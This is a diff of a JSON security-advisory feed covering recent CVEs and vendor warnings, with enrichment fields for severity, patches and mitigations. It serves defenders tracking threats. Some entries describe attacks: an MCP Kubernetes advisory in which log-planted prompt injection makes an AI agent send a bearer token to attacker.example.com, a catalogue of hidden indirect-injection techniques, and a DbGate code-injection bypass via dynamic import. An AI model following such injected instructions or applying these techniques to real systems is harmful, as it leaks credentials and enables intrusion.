@@ -1,10 +1,41 @@
 {
-  "generated": "2026-06-05T14:22:15.097560+00:00",
+  "generated": "2026-06-05T19:30:30.663870+00:00",
   "total": 27,
-  "kev": 0,
-  "zero_day": 13,
+  "kev": 1,
+  "zero_day": 14,
   "enriched": 10,
   "findings": [
+    {
+      "id": "CVE-2026-28318",
+      "title": "CVE-2026-28318 \u2014 SolarWinds Serv-U Uncontrolled Resource Consumption Vulnerability",
+      "summary": "Vendor: SolarWinds | Product: Serv-U. SolarWinds Serv-U contains an uncontrolled resource consumption vulnerability that allows specially crafted POST requests using the Content-Encoding: deflate header to crash the Serv-U service without authentication. Required action: Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable. (due 2026-06-19)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-28318",
+      "published": "2026-06-05",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-28318"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false,
+      "enrichment": {
+        "technical_details": "SolarWinds Serv\u2011U contains an uncontrolled resource consumption vulnerability where specially crafted POST requests using the Content\u2011Encoding: deflate header can crash the Serv\u2011U service without authentication.",
+        "affected_products": "Affected products unavailable.",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "true",
+        "active_exploitation": "true",
+        "threat_actors": "None known",
+        "mitigation": "Apply mitigations per vendor instructions in the SolarWinds advisory, follow applicable BOD 22-01 guidance for cloud services, or discontinue use if mitigations are unavailable.",
+        "vendor_advisory": "https://www.solarwinds.com/trust-center/security-advisories/CVE-2026-28318"
+      }
+    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a",
       "title": "Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider",
@@ -22,16 +53,46 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "CVE\u20112024\u201157727 is a path traversal vulnerability that lets an unauthenticated attacker retrieve arbitrary files (e.g., serverconfig.xml) via crafted HTTP requests, and can be combined with privilege\u2011escalation and file\u2011upload flaws to achieve full server compromise.",
-        "affected_products": "SimpleHelp Remote Support / RMM \u2014 versions 5.5.7 and earlier",
+        "technical_details": "CVE-2024-57727 is a directory traversal vulnerability in the SimpleHelp web interface that permits unauthenticated remote attackers to read arbitrary files on the server by supplying crafted path input to vulnerable endpoints.",
+        "affected_products": "SimpleHelp Remote Monitoring and Management versions 5.5.7 and earlier",
         "cvss_score": "7.5",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "Public technical disclosure and PoC\u2011style descriptions are available via Horizon3.ai (see source link).",
-        "patch_available": "Yes \u2014 patches released in SimpleHelp versions 5.5.8 through 5.5.15. Advisory URL: https://simple-help.com/blogs/security-vulnerabilities-in-simplehelp-5-5-7-and-earlier-what-you-need-to-know",
-        "active_exploitation": "Confirmed \u2013 CISA added CVE\u20112024\u201157727 to the KEV catalog and reports ransomware actors leveraging it; multiple industry write\u2011ups corroborate active exploitation.",
-        "threat_actors": "DragonForce, Medusa (and other ransomware groups reported)",
-        "mitigation": "Isolate or stop vulnerable SimpleHelp servers, upgrade immediately, hunt for compromise indicators, block/monitor SimpleHelp network traffic, do not expose remote services to the Internet, and follow vendor guidance.",
-        "vendor_advisory": "https://simple-help.com/blogs/security-vulnerabilities-in-simplehelp-5-5-7-and-earlier-what-you-need-to-know"
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "true",
+        "threat_actors": "Ransomware actors",
+        "mitigation": "Upgrade SimpleHelp to version 5.5.8 or later. If immediate upgrade is not possible, restrict access to SimpleHelp management interfaces to trusted IPs, block Internet access to the service, employ network segmentation and monitoring, and apply least\u2011privilege access controls.",
+        "vendor_advisory": "https://broadcom.com/support/security-center/protection-bulletin/cve-2024-57727-simplehelp-directory-traversal-vulnerability"
+      }
+    },
+    {
+      "id": "CVE-2026-47250",
+      "title": "MCP Server Kubernetes: kubectl-generic flag injection enables Kubernetes bearer token exfiltration",
+      "summary": "### Summary\nThe `kubectl_generic` tool in `mcp-server-kubernetes` passes user-supplied flags directly to kubectl without any allowlist, enabling a **privilege escalation attack** within Kubernetes environments. An attacker who already has limited cluster or codebase access, for example, a developer with pod-deployment permissions but not cluster-admin credentials, can plant a single structured JSON line in an application's log output. When an operator with a privileged kubeconfig uses the MCP server to read those logs and their AI agent follows the injected instruction, `kubectl_generic` is called with `--server=https://attacker.example.com` and `--insecure-skip-tls-verify=true`. kubectl sends all API requests,  including the `Authorization: Bearer <token>` header from the operator's kubeconfig to the attacker's endpoint. The captured token can then be replayed directly against the real Kubernetes API server, granting the attacker the full RBAC permissions of the operator's service account.\n\nThe token exfiltration mechanism was confirmed end-to-end with no cluster required. The full attack chain including indirect prompt injection via real pod logs was additionally confirmed using a live kind cluster and Claude Haiku (Anthropic API) as the agent.\n\n\n### Details\n### Vulnerable code\n\n`src/tools/kubectl-generic.ts`, lines 103\u2013118:\n\n```typescript\nif (input.flags) {\n  for (const [key, value] of Object.entries(input.flags)) {\n    if (value === true) {\n      cmdArgs.push(`--${key}`);\n    } else if (value !== false && value !== null && value !== undefined) {\n      cmdArgs.push(`--${key}=${value}`);   // \u2190 no allowlist; any kubectl flag accepted\n    }\n  }\n}\n\nif (input.args && input.args.length > 0) {\n  cmdArgs.push(...input.args);             // \u2190 also unconstrained\n}\n```\n\nBoth the `flags` object and the `args` array are passed verbatim to `execFileSync(\"kubectl\", cmdArgs)`.\n\n### Why two flags are needed\n\nkubectl deliberately suppresses `Authorization: Bearer` headers over pl",
+      "link": "https://github.com/advisories/GHSA-6mx4-4h42-r8vh",
+      "published": "2026-06-05T15:40:00Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-47250"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "The kubectl_generic tool in mcp-server-kubernetes passes user-supplied flags directly to kubectl without any allowlist, enabling a privilege escalation attack. An attacker with limited access can plant a structured JSON line in application logs; when an operator with a privileged kubeconfig uses the MCP server to read those logs and an AI agent follows the injected instruction, kubectl_generic can be coerced to execute kubectl commands that exfiltrate the Kubernetes bearer token.",
+        "affected_products": "Affected products unavailable.",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "false",
+        "patch_available": "Patch availability unknown.",
+        "active_exploitation": "Active exploitation status unknown.",
+        "threat_actors": "None known",
+        "mitigation": "Remove or disable the kubectl_generic command; do not allow privileged kubeconfigs to be used with untrusted MCP servers or agents; sanitize and do not auto-execute user-supplied flags; implement an allowlist for kubectl flags and require manual review of logs containing structured input.",
+        "vendor_advisory": "https://github.com/advisories/GHSA-6mx4-4h42-r8vh"
       }
     },
     {
@@ -49,15 +110,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Attacks operate at the browser layer via malicious or compromised browser extensions and AI plugins that collect/exfiltrate browsing context and credentials, phishing pages and credential harvesting, in\u2011browser command execution (ClickFix\u2011style) and exploitation of vulnerable browser\u2011facing components.",
+        "technical_details": "Technical details unavailable.",
         "affected_products": "Affected products unavailable.",
-        "cvss_score": "0.0",
+        "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "No specific public PoC or weaponized exploit for a single named vulnerability cited; exploit information unavailable.",
-        "patch_available": "No specific vendor patch known; patch information unavailable.",
-        "active_exploitation": "DBIR and reporting confirm active browser\u2011layer attacks (malicious extensions, phishing pages, credential theft, 'ClickFix' style attacks and shadow AI plugins) are occurring in the wild.",
-        "threat_actors": "None known",
-        "mitigation": "Apply CIS/DBIR recommendations: enforce browser extension control/whitelisting, require MFA, use DNS/web filtering, deploy browser isolation or zero\u2011trust browser controls, inventory and remove unauthorized AI/browser extensions, continuous vulnerability management and timely patching, endpoint anti\u2011malware and privilege management.",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "Patch availability unknown.",
+        "active_exploitation": "Active exploitation status unknown.",
+        "threat_actors": "Threat actors unknown.",
+        "mitigation": "Implement browser\u2011layer visibility, enforce governance of AI use within browsers, control and monitor high\u2011risk extensions, and deploy detection for credential theft occurring inside browsers.",
         "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
@@ -78,16 +139,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Insufficient validation of user-supplied input in the CLI of Cisco Catalyst SD-WAN Manager allows an authenticated, local attacker to upload a crafted file and execute arbitrary commands as root.",
-        "affected_products": "Cisco Catalyst SD-WAN Manager (formerly SD-WAN vManage) \u2013 affected CLI component",
-        "cvss_score": "0.0",
+        "technical_details": "A CLI vulnerability in Cisco Catalyst SD\u2011WAN Manager that allows an authenticated, local attacker to execute arbitrary commands as root via the management CLI.",
+        "affected_products": "Cisco Catalyst SD\u2011WAN Manager (formerly SD\u2011WAN vManage)",
+        "cvss_score": "7.8",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Public exploit/PoC reports: news sources report active exploitation; no confirmed public PoC URL found in sources.",
-        "patch_available": "Patch unavailable. Cisco states no fix currently; monitoring and mitigation guidance provided in advisory.",
-        "active_exploitation": "Confirmed active exploitation reported by Cisco and multiple security news outlets (Cisco advisory, Bleeping Computer, Help Net Security).",
+        "exploit_available": "false",
+        "patch_available": "false",
+        "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Follow Cisco advisory mitigations and hardening guidance (restrict access to management interfaces, apply recommended configuration/workarounds in advisory).",
-        "vendor_advisory": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx"
+        "mitigation": "Restrict local/SSH access to the management interface, follow CISA/agency guidance to inventory SD\u2011WAN systems, apply available compensating controls, and monitor for indicators of compromise.",
+        "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
     {
@@ -108,13 +169,13 @@
       "enrichment": {
         "technical_details": "Technical details unavailable.",
         "affected_products": "Affected products unavailable.",
-        "cvss_score": "0.0",
+        "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Exploit not applicable / Exploit information unavailable.",
-        "patch_available": "Patch not applicable / Patch information unavailable.",
-        "active_exploitation": "None reported / active exploitation information unavailable.",
-        "threat_actors": "None known",
-        "mitigation": "General mitigation and hardening guidance available in the blog (use exposure management, continuous detection, VPR prioritization, Tenable Hexa AI automation, Tenable One AI Exposure for inventory and policy enforcement).",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "Patch availability unknown.",
+        "active_exploitation": "Active exploitation status unknown.",
+        "threat_actors": "Threat actors unknown.",
+        "mitigation": "Agencies should harden systems with AI-enabled cyber defenses and inventory AI assets; Tenable One AI Exposure can help agencies discover and inventory AI tools and libraries and apply AI usage policies across the environment to help prioritize vulnerabilities and automate remediation workflows.",
         "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
@@ -134,16 +195,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect Prompt Injection (IPI) occurs when adversarial content seeded on web pages is consumed by AI agents or browsing-enabled LLMs, causing the agent to follow malicious instructions or leak secrets (examples observed include financial fraud, data destruction, and API key theft via crafted web content and payloads delivered through webpages and RAG sources).",
+        "technical_details": "Indirect Prompt Injection (IPI) occurs when AI agents ingest attacker\u2011controlled content (web pages, documents, files) that contain malicious instructions. The attacker poisons the content\u2014often hidden via CSS, HTML comments, metadata, or special tags\u2014so the model treats the embedded instructions as authoritative, leading to actions such as data exfiltration, command execution, financial transactions, or content suppression. Observed techniques include CSS concealment, HTML comment injection, system\u2011prompt tag spoofing, magic\u2011string impersonation, meta\u2011namespace injection, accessibility\u2011attribute abuse, and TOCTOU sandbox\u2011escape chains (e.g., the Antigravity IDE chain).",
         "affected_products": "Affected products unavailable.",
-        "cvss_score": "0.0",
+        "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "No public exploit or PoC known.",
-        "patch_available": "No vendor patch available.",
-        "active_exploitation": "Confirmed active exploitation in the wild.",
-        "threat_actors": "None known",
-        "mitigation": "Hardening and mitigations include multi\u2011layered defenses: input sanitization and filtering, provenance/trust signals, browsing content validation, denylist/allowlist policies, RAG pipeline hardening, model\u2011level guardrails, and monitoring for anomalous agent behavior.",
-        "vendor_advisory": "http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html"
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "true",
+        "threat_actors": "Threat actors unknown.",
+        "mitigation": "Implement layered defenses: restrict AI agents from accessing untrusted external content; enforce strict parsing that separates data from instructions; sanitize or strip hidden/high\u2011risk HTML elements (CSS, comments, metadata) before ingestion; conduct quarterly IPI red\u2011team exercises using Forcepoint\u2019s payload taxonomy; apply vendor patches (e.g., the Antigravity IDE patch).",
+        "vendor_advisory": "https://blog.google/security/prompt-injections-web/"
       }
     },
     {
@@ -162,15 +223,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection (IPI) occurs when adversarial instructions are embedded in external data, documents, web content, or tooling that a large language model consumes. These malicious instructions can modify the model's output even though the user did not provide direct input, leveraging the model's reliance on external sources and agentic automation.",
-        "affected_products": "Google Workspace (features integrating Gemini and agentic automation)",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "No public proof-of-concept or weaponized exploit reported.",
-        "patch_available": "Vendor does not list a single \"patch\"; mitigation is provided via a continuous layered strategy.",
-        "active_exploitation": "Reports of in\u2011the\u2011wild indirect prompt injection payloads (Forcepoint) but no confirmed mass exploitation tied to a named threat actor.",
+        "technical_details": "Indirect prompt injection (IPI) hides malicious instructions in data sources (web pages, docs, emails, calendar invites, metadata, hidden HTML/CSS, or images). When the LLM ingests that data during a request, the embedded instructions are treated as part of the prompt, allowing data exfiltration, command execution, or content manipulation. Noma Labs demonstrated a zero\u2011click attack (GeminiJack) where a shared document with hidden instructions caused Gemini Enterprise/Vertex AI Search to exfiltrate Gmail, Calendar, and Docs content via an invisible image request. Forcepoint cataloged live payloads using CSS display:none, tiny fonts, metadata abuse, and magic\u2011string spoofing to poison AI inputs.",
+        "affected_products": "Google Gemini Enterprise (Gemini in Workspace), Vertex AI Search (prior deployments)",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "true \u2014 https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/",
+        "patch_available": "true \u2014 http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html",
+        "active_exploitation": "true \u2014 http://forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads, http://hackread.com/hackers-hidden-site-instruction-attack-ai-assistants",
         "threat_actors": "None known",
-        "mitigation": "Implement continuous, layered defenses: verify content provenance and trust signals, vet documents and tools before ingestion, sanitize/filter external content, restrict privileges of agentic tools, use secondary model checks for validation, enforce strict access controls, and maintain robust logging, monitoring and rapid response processes.",
+        "mitigation": "Use Google\u2019s layered defenses \u2013 prompt\u2011injection content classifiers, markdown/URL sanitization, suspicious URL redaction, security thought\u2011reinforcement, user\u2011confirmation framework, end\u2011user mitigation notifications, model hardening, and ML\u2011based defenses; additionally block IPI URLs at network gateways (e.g., Forcepoint protections).",
         "vendor_advisory": "http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html"
       }
     },
@@ -190,15 +251,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection\u2014malicious or adversarial web content (including third\u2011party iframes or user\u2011generated content) can influence an agentic planner model to take unintended actions (e.g., financial transactions or data exfiltration). Chrome's mitigations include a separate User Alignment Critic that vets planned actions using only metadata, Agent Origin Sets to restrict readable and writable origins, deterministic checks for model\u2011generated URLs, prompt\u2011injection classifiers, user confirmations for sensitive steps, and continuous red\u2011teaming and monitoring.",
-        "affected_products": "Chrome (agentic/Gemini-enabled features)",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "No public PoC or weaponized exploit reported",
-        "patch_available": "No single patch; mitigations and features implemented in Chrome as described in the advisory; Chrome auto\u2011update used to deliver fixes. Vendor advisory provided.",
-        "active_exploitation": "No confirmed active exploitation reported in the advisory or prior trusted research.",
+        "technical_details": "Indirect prompt injection (IPI) \u2013 attacker\u2011controlled web content crafts inputs that influence agentic browser prompts or agent instructions, causing the agent to perform unsafe actions or disclose sensitive data. Google\u2019s design adds a supervising agent and layered restrictions to limit origin access and unsafe actions.",
+        "affected_products": "Chrome (agentic browsing / Gemini integration)",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "Exploit availability unknown",
+        "patch_available": "true \u2014 http://security.googleblog.com/2025/12/architecting-security-for-agentic.html",
+        "active_exploitation": "Active exploitation status unknown",
         "threat_actors": "None known",
-        "mitigation": "Use Chrome's layered defenses\u2014user confirmations for sensitive actions, origin\u2011gating (Agent Origin Sets) limiting read vs read\u2011write origins, User Alignment Critic to veto misaligned actions, real\u2011time prompt\u2011injection detection, and keep Chrome auto\u2011updates enabled.",
+        "mitigation": "Use Chrome\u2019s new layered defenses (restrict origin access, block indirect prompt injections), avoid visiting untrusted sites, and disable agentic/assistant features until mitigations are fully deployed.",
         "vendor_advisory": "http://security.googleblog.com/2025/12/architecting-security-for-agentic.html"
       }
     },
@@ -218,16 +279,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Technical details unavailable.",
+        "technical_details": "A linear buffer overflow in the CrabbyAVIF Rust crate's unsafe code path was discovered and fixed pre\u2011release; Android's Scudo hardened allocator used guard pages to turn the overflow into a crash, rendering it non\u2011exploitable. Tracked as CVE\u20112025\u201148530.",
         "affected_products": "Affected products unavailable.",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "No public PoC or weaponized exploit mentioned in the blog post.",
-        "patch_available": "Official patches are distributed via Android Security Bulletins and platform updates; specific patch URLs are not provided in the blog post.",
-        "active_exploitation": "No confirmed active exploitation reported in the blog post.",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "false",
+        "patch_available": "true \u2014 patch: https://android.googlesource.com/platform/external/rust/crabbyavif/+/5262cd9befecb4f8865925c23eb543f19967e050",
+        "active_exploitation": "false",
         "threat_actors": "None known",
-        "mitigation": "Continue to apply Android security updates promptly; use app sandboxing and least\u2011privilege configurations.",
-        "vendor_advisory": "http://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html"
+        "mitigation": "Apply the official patch above; use Scudo hardened allocator (already default on many Android devices); follow unsafe Rust review practices and training as described in Google\u2019s guidance.",
+        "vendor_advisory": "https://source.android.com/docs/security/bulletin/2025-08-01"
       }
     },
     {
@@ -244,19 +305,7 @@
       ],
       "cve_ids": [],
       "is_zero_day": true,
-      "is_high_severity": true,
-      "enrichment": {
-        "technical_details": "Indirect prompt injection (IPI) involves malicious instructions embedded in external data sources (emails, documents, calendar invites, web content) that cause AI systems to treat the content as instructions, leading to data leakage or unauthorized actions.",
-        "affected_products": "Affected products unavailable.",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "No public PoC or weaponized exploit known",
-        "patch_available": "No vendor patch; mitigation guidance provided in advisory: http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html",
-        "active_exploitation": "Reports of increased indirect prompt injection attempts in the wild have been observed by multiple vendors but no confirmed widescale active exploitation of a specific CVE.",
-        "threat_actors": "None known",
-        "mitigation": "Use layered defenses per vendor advisory: treat external content as untrusted, apply input sanitization and canonicalization, enforce least privilege for model outputs and data access, add explicit instruction\u2011guard rails, add multi\u2011layer detection and telemetry, and keep models/clients updated. See vendor advisory for details.",
-        "vendor_advisory": "http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html"
-      }
+      "is_high_severity": true
     },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a",
@@ -271,19 +320,7 @@
       ],
       "cve_ids": [],
       "is_zero_day": true,
-      "is_high_severity": false,
-      "enrichment": {
-        "technical_details": "Actors gain initial access by exploiting publicly known CVEs (e.g., CVE\u20112023\u201120198) using the Web Services Management Agent endpoints to bypass authentication and create unauthorized admin accounts. Persistence is achieved by modifying ACLs to allow attacker\u2011controlled IPs, opening standard/non\u2011standard ports (SSH, SFTP, RDP, FTP, HTTP/HTTPS), and enabling HTTP/HTTPS servers on Cisco devices. After compromise, they execute commands via SNMP, SSH, web UI, and TCL scripts, and use SPAN/RSPAN/ERSPAN to capture in\u2011transit traffic for collection of subscriber data, configurations, and credentials.",
-        "affected_products": "Cisco IOS / IOS XE (CVE-2018-0171, CVE-2023-20198, CVE-2023-20273); Ivanti (CVE-2024-21887, CVE-2023-46805); Palo Alto Networks (CVE-2024-3400); also potentially Fortinet firewalls, Juniper firewalls, Microsoft Exchange, Nokia routers & switches, Sierra Wireless devices, SonicWall firewalls.",
-        "cvss_score": "0.0",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "No public proof\u2011of\u2011concept URLs are provided; however, publicly available tools such as siet.py, map.tcl, tclproxy.tcl, and wodSSHServer are referenced as being used by the actors.",
-        "patch_available": "Vendor patches are available from the affected vendors (e.g., Cisco, Ivanti, Palo Alto Networks). Specific patch URLs are not provided in the advisory.",
-        "active_exploitation": "Confirmed active exploitation in the wild has been reported; the actors have successfully exploited publicly known CVEs to gain persistent access to government, telecom, transportation, lodging, and military infrastructure networks globally.",
-        "threat_actors": "Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, GhostEmperor",
-        "mitigation": "Disable all unused ports and protocols; change default administrative credentials; require public\u2011key authentication; use encrypted management protocols (SSH, SFTP, HTTPS); deploy vendor\u2011recommended OS versions and apply all security updates; follow Cisco hardening guides; monitor device logs; audit non\u2011root accounts; review ACL changes and traffic mirroring configurations.",
-        "vendor_advisory": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a"
-      }
+      "is_high_severity": false
     },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a",
@@ -332,6 +369,132 @@
       ],
       "is_zero_day": true,
       "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-48017",
+      "title": "DbGate: Remote Code Execution via functionName injection in loadReader endpoint",
+      "summary": "### Summary\n\nThe `POST /runners/load-reader` endpoint in DbGate accepts a `functionName` parameter that is directly interpolated into a JavaScript code template without any sanitization or validation. An authenticated user (with basic access, no special permissions required) can inject arbitrary JavaScript code that executes on the server with full process privileges, bypassing the `require=null` sandbox restriction.\n\n### Details\n\nThe `loadReader` endpoint in `packages/api/src/controllers/runners.js` (line 353) takes a `functionName` parameter from the request body and passes it to `compileShellApiFunctionName()` which performs no sanitization:\n\n**Vulnerable code** ([permalink](https://github.com/dbgate/dbgate/blob/ea3a61077ab09775c39890c465f0b3e97f6c812e/packages/api/src/controllers/runners.js#L352-L368)):\n\n```javascript\n  loadReader_meta: true,\n  async loadReader({ functionName, props }) {\n    if (!platformInfo.isElectron) {\n      if (props?.fileName && !checkSecureDirectories(props.fileName)) {\n        return { errorMessage: 'DBGM-00289 Unallowed file' };\n      }\n    }\n    const prefix = extractShellApiPlugins(functionName)\n      .map(packageName => `// @require ${packageName}\\n`)\n      .join('');\n\n    const promise = new Promise((resolve, reject) => {\n      const runid = crypto.randomUUID();\n      this.requests[runid] = { resolve, reject, exitOnStreamError: true };\n      this.startCore(runid, loaderScriptTemplate(prefix, functionName, props, runid));\n    });\n    return promise;\n  },\n```\n\nThe `loaderScriptTemplate` at line 57-68 directly interpolates the compiled function name:\n\n```javascript\nconst loaderScriptTemplate = (prefix, functionName, props, runid) => `\n${prefix}\nconst dbgateApi = require(process.env.DBGATE_API);\ndbgateApi.initializeApiEnvironment();\n${requirePluginsTemplate(extractShellApiPlugins(functionName, props))}\nrequire=null;\nasync function run() {\nconst reader=await ${compileShellApiFunctionName(functionName)}(${JSON.stringify(props)});\nconst wr",
+      "link": "https://github.com/advisories/GHSA-hv83-ggc4-v385",
+      "published": "2026-06-05T16:39:38Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-48017"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-47684",
+      "title": "Sync-in Server: SSRF protection bypass via IPv4-mapped IPv6 addresses in regExpPrivateIP",
+      "summary": "Summary:\nThe private IP blocklist regex used in the URL download feature does not match IPv4-mapped IPv6 addresses (e.g. ::ffff:127.0.0.1), allowing SSRF protection to be bypassed on dual-stack systems.\n\nAffected components\n\nbackend/src/applications/files/services/files-manager.service.ts \u2013 downloadFromUrl() checks regExpPrivateIP against request.socket.remoteAddress.\nbackend/src/applications/files/utils/url-file.ts \u2013 regExpPrivateIP does not include ::ffff:<ipv4> variants.\n\nDetails:\nThe regExpPrivateIP regex in backend/src/applications/files/utils/url-file.ts correctly blocks standard IPv4 private ranges but does not include ::ffff: prefixed variants. On dual-stack systems, Node.js can report a socket's remoteAddress in IPv4-mapped IPv6 form, meaning the check in FilesManager.downloadFromUrl() can be bypassed entirely.\n\nPoC:\n[poc.pdf](https://github.com/user-attachments/files/26990874/poc.pdf)\n\n\n\n\nProof:\n<img width=\"1080\" height=\"842\" alt=\"1000226655\" src=\"https://github.com/user-attachments/assets/797cea83-0a08-4a16-a91b-31c51068d473\" />\n\n\n\n\n\nImpact:\nAn attacker can supply a crafted URL pointing to an internal address that gets reported as ::ffff:127.0.0.1 or ::ffff:10.x.x.x, causing the server to fetch internal resources that should be blocked. Any user with access to the file download feature is a potential attacker.",
+      "link": "https://github.com/advisories/GHSA-q4x5-8cj6-52wg",
+      "published": "2026-06-05T16:34:59Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-47684"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-47680",
+      "title": "Source controller: Improper path handling allows traversal",
+      "summary": "### Impact\n\nAn actor with the ability to influence the contents of a bucket referenced by a `Bucket` resource can cause source-controller to write fetched object data to paths outside the per-reconciliation working directory.\n\nThe corruption surface is bounded by source-controller's own and downstream Flux controllers' digest verification: source-controller verifies stored artifact digests during reconciliation and rebuilds on divergence; consumers (kustomize-controller, helm-controller) verify the digest of fetched artifacts and reject mismatches. These checks prevent a manipulated artifact from reaching the cluster, but an attacker can still write files anywhere the source-controller pod has permission to write.\n\nSeparately, a user with permission to create or update `GitRepository` resources can cause source-controller to test for the existence of paths outside the cloned repository. Because the result is exposed via the resource's status, this allows limited enumeration of file paths on the controller pod. This surface exists only on source-controller v1.6.0 and later, where the sparse-checkout feature was introduced.\n\n### Patches\n\nThis vulnerability was fixed in source-controller **v1.8.5**.\n\n### Workarounds\n\nThere is no in-product workaround. Users should upgrade to a patched version.\n\nAs a defense-in-depth measure for the GitRepository sparse-checkout surface, a `ValidatingAdmissionPolicy` (or a third-party policy engine such as Kyverno or OPA Gatekeeper) can be deployed to reject `GitRepository` resources whose `.spec.sparseCheckout` entries contain `..` or absolute path segments.\n\n### References\n\n- [source-controller#2054](https://github.com/fluxcd/source-controller/pull/2054)\n\n### Credits\n\nThe path traversal in the Bucket reconciler was reported by JUNYI LIU. The path traversal in the GitRepository sparse-checkout validation was found and patched by the Flux engineering team.\n\n### For more information\n\nIf you have any questions or comments about this advis",
+      "link": "https://github.com/advisories/GHSA-jjrm-hr5f-673x",
+      "published": "2026-06-05T16:32:51Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-47680"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-47670",
+      "title": "Authenticated Remote Code Execution via loadReader functionName code injection in DbGate",
+      "summary": "### Summary\n\nDbGate is vulnerable to authenticated Remote Code Execution (RCE). Any user with valid DbGate credentials can execute arbitrary OS commands as root by exploiting an unsanitized `functionName` parameter in the `/runners/load-reader` endpoint. The `require = null` mitigation is trivially bypassed via dynamic `import()`.\n\n\n<br/>\n\n### Details\n\n**Code injection via `functionName` in loadReader**\n\nThe `/runners/load-reader` endpoint interpolates the `functionName` parameter directly into a dynamically generated JavaScript script template without any sanitization:\n\n```javascript\n// packages/api/src/controllers/runners.js (loadReader / loaderScriptTemplate)\nconst reader = await dbgateApi.${functionName}({...});\n```\n\nBy injecting a newline character into `functionName`, an attacker breaks out of the template expression and injects arbitrary JavaScript code. The injected code uses `await import('child_process')` to bypass the `require = null` mitigation (since `import()` is a language keyword, not a function that can be nullified), achieving arbitrary command execution as the process user (root in Docker).\n\nThe June 2025 security fix ([commit cf3f95c](https://github.com/dbgate/dbgate/commit/cf3f95c952)) added `require = null` to the generated script, but this is trivially bypassed:\n\n```javascript\n// Mitigation in generated script:\nrequire = null;\n\n// Bypass via dynamic import (language keyword, cannot be 